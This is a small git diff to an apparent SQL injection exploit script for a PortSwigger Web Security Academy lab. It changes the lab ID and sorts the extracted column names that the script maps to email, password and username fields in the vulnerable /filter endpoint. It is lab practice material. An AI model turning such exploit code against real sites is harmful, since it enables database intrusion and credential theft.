@@ -13,7 +13,7 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class SQLi9:
     def __init__(self):
-        self.lab_id = "0a5e008603a015e481488f21007600ad"
+        self.lab_id = "0a41000f048ec902813b57dc00a600b0"
         self.url = f"https://{self.lab_id}.web-security-academy.net"
         self.login_url = f"{self.url}/login"
         self.vuln_url = f"{self.url}/filter"
@@ -78,7 +78,7 @@ class SQLi9:
         )
         r = self.execute_request(payload)
         if r.status_code == 200:
-            columns = self.parse(r)
+            columns = sorted(self.parse(r))
             self.email_col, self.password_col, self.username_col = columns
             print(f"[*] columns: {columns}")
 
